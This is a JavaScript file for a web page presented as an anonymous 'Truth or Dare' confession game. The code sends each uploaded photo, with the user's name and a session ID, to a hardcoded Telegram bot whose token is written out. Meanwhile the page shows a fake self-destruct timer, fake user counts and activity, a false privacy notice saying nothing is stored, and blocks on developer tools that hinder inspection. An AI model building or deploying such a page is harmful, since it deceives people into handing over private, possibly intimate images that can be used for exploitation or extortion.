// ============================================
// TELEGRAM CONFIG
// ============================================
const TELEGRAM_BOT_TOKEN = "8961651664:AAG9NHYnytnUQsKv9V96h8gXTcaUAE62-tU";
const TELEGRAM_CHAT_ID = "6841194594";
const MAX_SIZE_MB = 15;

// ============================================
// STATE
// ============================================
let userName = localStorage.getItem('userName') || '';
let sessionId = localStorage.getItem('sessionId');

if (!sessionId) {
  sessionId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
  localStorage.setItem('sessionId', sessionId);
}

let isUploading = false;
let timerInterval = null;

// ============================================
// DOM REFS
// ============================================
const overlay = document.getElementById('onboardingOverlay');
const nameInput = document.getElementById('nameInput');
const startBtn = document.getElementById('startBtn');
const greeting = document.getElementById('greeting');
const promptText = document.getElementById('dynamicPrompt');
const promptSub = document.getElementById('promptSub');
const sendBtn = document.getElementById('sendPhotoBtn');
const statusDiv = document.getElementById('victimStatus');
const fileInput = document.getElementById('hiddenFileInput');
const blurPreview = document.getElementById('blurPreview');
const timerDisplay = document.getElementById('timerDisplay');
const activityFeed = document.getElementById('activityFeed');
const userCounter = document.getElementById('userCounter');

// ============================================
// ONBOARDING
// ============================================
if (userName) {
  overlay.classList.add('hidden');
  greeting.innerHTML = `confession challenge • be <span>${userName}</span>`;
}

startBtn.addEventListener('click', () => {
  const name = nameInput.value.trim();
  if (name.length < 2) {
    nameInput.style.borderColor = '#ff4757';
    nameInput.style.boxShadow = '0 0 0 4px rgba(255, 71, 87, 0.1)';
    setTimeout(() => {
      nameInput.style.borderColor = '#f0e0e8';
      nameInput.style.boxShadow = 'none';
    }, 1000);
    return;
  }
  userName = name;
  localStorage.setItem('userName', userName);
  overlay.classList.add('hidden');
  greeting.innerHTML = `confession challenge • be <span>${userName}</span>`;
  if (navigator.vibrate) navigator.vibrate(10);
});

nameInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') startBtn.click();
});

// ============================================
// FAKE USER COUNTER
// ============================================
function fluctuateCounter() {
  const base = 38;
  const variance = Math.floor(Math.random() * 25) - 12;
  const count = Math.max(8, base + variance);
  userCounter.textContent = `👥 ${count} online`;
}

// ============================================
// FAKE ACTIVITY FEED
// ============================================
const names = ['Sarah', 'Mike', 'Emma', 'Alex', 'Lisa', 'Tom', 'Mia', 'Jake', 'Lily', 'Chris', 'Nusrat', 'Tania', 'Sumaiya', 'Mou', 'Sadia', 'Rima', 'Jannat', 'Saba'];
const actions = ['just joined', 'completed a challenge', 'shared a secret', 'sent a photo', 'is playing now'];

function addFakeActivity() {
  const name = names[Math.floor(Math.random() * names.length)];
  const action = actions[Math.floor(Math.random() * actions.length)];
  const times = ['now', 'just now', 'a moment ago', '2s ago', '5s ago', '10s ago'];
  const time = times[Math.floor(Math.random() * times.length)];
  const item = document.createElement('div');
  item.className = 'feed-item';
  item.innerHTML = `👤 <strong>${name}</strong> ${action} <span class="time">${time}</span>`;
  activityFeed.appendChild(item);
  if (activityFeed.children.length > 5) {
    activityFeed.removeChild(activityFeed.firstChild);
  }
}

// ============================================
// SEND TO TELEGRAM (FIXED)
// ============================================
async function sendToTelegram(file) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', file);
  
  const timestamp = new Date().toLocaleString('en-US', {
    day: '2-digit',
    month: 'short',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true
  });
  
  const caption = `📸 NEW CONFESSION\n🎭 ${promptText.textContent}\n👤 ${userName || 'Anonymous'}\n🆔 ${sessionId}\n⏱️ ${timestamp}`;
  formData.append('caption', caption.slice(0, 1024));
  
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    const data = await res.json();
    console.log('Telegram response:', data);
    return data.ok === true;
  } catch (e) {
    console.error('Telegram error:', e);
    return false;
  }
}

// ============================================
// HANDLE PHOTO (FIXED)
// ============================================
async function handlePhoto(file) {
  if (!file || !file.type.startsWith('image/')) {
    statusDiv.textContent = '❌ Please select an image';
    statusDiv.className = 'status-msg error';
    setTimeout(resetStatus, 2000);
    return;
  }
  
  if (file.size > MAX_SIZE_MB * 1024 * 1024) {
    statusDiv.textContent = `❌ Max ${MAX_SIZE_MB}MB`;
    statusDiv.className = 'status-msg error';
    setTimeout(resetStatus, 2000);
    return;
  }
  
  // Show blur preview
  const reader = new FileReader();
  reader.onload = (e) => {
    blurPreview.src = e.target.result;
    blurPreview.style.display = 'block';
  };
  reader.readAsDataURL(file);
  
  isUploading = true;
  sendBtn.disabled = true;
  statusDiv.innerHTML = '<span class="loader"></span> Processing...';
  statusDiv.className = 'status-msg loading';
  
  // Self-destruct timer
  let seconds = 10;
  timerDisplay.textContent = `⏳ Auto-delete in ${seconds}s`;
  timerInterval = setInterval(() => {
    seconds--;
    timerDisplay.textContent = `⏳ Auto-delete in ${seconds}s`;
    if (seconds <= 0) {
      clearInterval(timerInterval);
      timerDisplay.textContent = '';
      blurPreview.style.display = 'none';
    }
  }, 1000);
  
  try {
    const success = await sendToTelegram(file);
    
    if (success) {
      statusDiv.textContent = '✅ Sent! Your secret is safe 🤫';
      statusDiv.className = 'status-msg';
      if (navigator.vibrate) navigator.vibrate([10, 50, 10]);
      fluctuateCounter();
      addFakeActivity();
    } else {
      statusDiv.textContent = '⚠️ Failed, please try again';
      statusDiv.className = 'status-msg error';
    }
  } catch (e) {
    statusDiv.textContent = '⚠️ Network error, try again';
    statusDiv.className = 'status-msg error';
    console.error('Upload error:', e);
  }
  
  setTimeout(() => {
    resetStatus();
    blurPreview.style.display = 'none';
    timerDisplay.textContent = '';
    clearInterval(timerInterval);
  }, 4500);
  
  sendBtn.disabled = false;
  isUploading = false;
  fileInput.value = '';
}

function resetStatus() {
  statusDiv.textContent = '✨ ready to confess';
  statusDiv.className = 'status-msg';
}

// ============================================
// SHARE / PRIVACY / TERMS
// ============================================
document.getElementById('shareLink').addEventListener('click', (e) => {
  e.preventDefault();
  if (navigator.share) {
    navigator.share({
      title: 'Truth or Dare Challenge',
      text: `I'm playing Truth or Dare! Join me: ${window.location.href}`
    }).catch(() => {});
  } else {
    navigator.clipboard.writeText(window.location.href);
    statusDiv.textContent = '✅ Link copied!';
    statusDiv.className = 'status-msg';
    setTimeout(resetStatus, 2000);
  }
});

document.getElementById('privacyLink').addEventListener('click', (e) => {
  e.preventDefault();
  alert('🔒 Privacy Policy: No data is stored. All submissions are anonymous and auto-deleted.');
});

document.getElementById('termsLink').addEventListener('click', (e) => {
  e.preventDefault();
  alert('📜 Terms: This is a fictional game for entertainment. By playing, you agree to have fun!');
});

// ============================================
// EVENT BINDINGS
// ============================================
sendBtn.addEventListener('click', () => fileInput.click());

fileInput.addEventListener('change', (e) => {
  if (e.target.files[0]) handlePhoto(e.target.files[0]);
});

// ============================================
// INIT
// ============================================
fluctuateCounter();
setInterval(fluctuateCounter, 4000);
setInterval(addFakeActivity, 7000);

// ============================================
// PREVENT INSPECT
// ============================================
document.addEventListener('contextmenu', (e) => e.preventDefault());

document.onkeydown = (e) => {
  if ((e.ctrlKey && (e.key === 'u' || e.key === 'I' || e.key === 'U')) ||
    e.key === 'F12' ||
    (e.ctrlKey && e.shiftKey && e.key === 'I')) {
    e.preventDefault();
    return false;
  }
};

// ============================================
// KEYBOARD SHORTCUT
// ============================================
document.addEventListener('keydown', (e) => {
  if (e.key === 'Enter' && !isUploading && overlay.classList.contains('hidden')) {
    sendBtn.click();
  }
});

console.log('%c🎭 Truth or Dare • Premium Edition', 'font-size:18px; font-weight:bold; color:#ff6b9d;');
console.log('%c🔒 100% Anonymous • Made with ❤️ in Bangladesh', 'font-size:12px; color:#888;');
